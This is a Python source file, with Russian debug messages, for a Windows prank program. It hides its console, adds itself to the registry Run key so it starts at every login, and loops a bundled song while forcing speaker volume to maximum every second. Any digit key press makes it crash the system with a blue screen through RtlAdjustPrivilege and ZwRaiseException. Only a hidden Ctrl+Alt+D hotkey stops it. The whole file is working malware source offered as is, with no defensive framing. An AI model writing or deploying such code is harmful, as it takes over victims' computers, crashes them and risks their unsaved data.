import os
import sys
import pygame
import threading
import time
import ctypes
import winreg
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import COMError, CoInitialize, CoUninitialize
import keyboard

stop_flag = threading.Event()

def hide_console():
    ctypes.windll.kernel32.FreeConsole()

def get_music_file():
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(sys.argv[0])
    music_path = os.path.join(base_path, 'song.mp3')
    print("Ищем файл:", music_path)  # Отладка
    return music_path

def play_music():
    pygame.mixer.init()
    music_file = get_music_file()
    if os.path.exists(music_file):
        pygame.mixer.music.load(music_file)
        pygame.mixer.music.play(-1, 0.0)
    else:
        print("Файл не найден:", music_file)

    while not stop_flag.is_set():
        time.sleep(1)

def set_max_volume():
    CoInitialize()
    devices = AudioUtilities.GetSpeakers()
    try:
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, 0, None)
        volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(1.0, None)
        del volume
        del interface
    except COMError as e:
        print(f"Ошибка при установке громкости: {e}")
    CoUninitialize()

def keep_volume_max():
    while not stop_flag.is_set():
        try:
            set_max_volume()
        except COMError:
            pass
        time.sleep(1)

def add_to_autostart():
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    exe_path = os.path.abspath(sys.argv[0])
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "MyMusicApp", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(reg_key)
    except Exception:
        pass

def remove_from_autostart():
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(reg_key, "MyMusicApp")
        winreg.CloseKey(reg_key)
    except Exception:
        pass

def trigger_bsod_on_digit():
    while True:
        for i in range(10):
            if keyboard.is_pressed(str(i)):
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.ZwRaiseException(0xC0000025, 0, 0)
                break
        time.sleep(0.1)

def check_keypress():
    while True:
        if keyboard.is_pressed("ctrl+alt+d"):
            stop_flag.set()
            remove_from_autostart()
            sys.exit()

def main():
    hide_console()
    add_to_autostart()

    volume_thread = threading.Thread(target=keep_volume_max)
    volume_thread.daemon = True
    volume_thread.start()

    music_thread = threading.Thread(target=play_music)
    music_thread.start()

    bsod_thread = threading.Thread(target=trigger_bsod_on_digit)
    bsod_thread.daemon = True
    bsod_thread.start()

    key_thread = threading.Thread(target=check_keypress)
    key_thread.start()

    music_thread.join()
    key_thread.join()

if __name__ == "__main__":
    main()
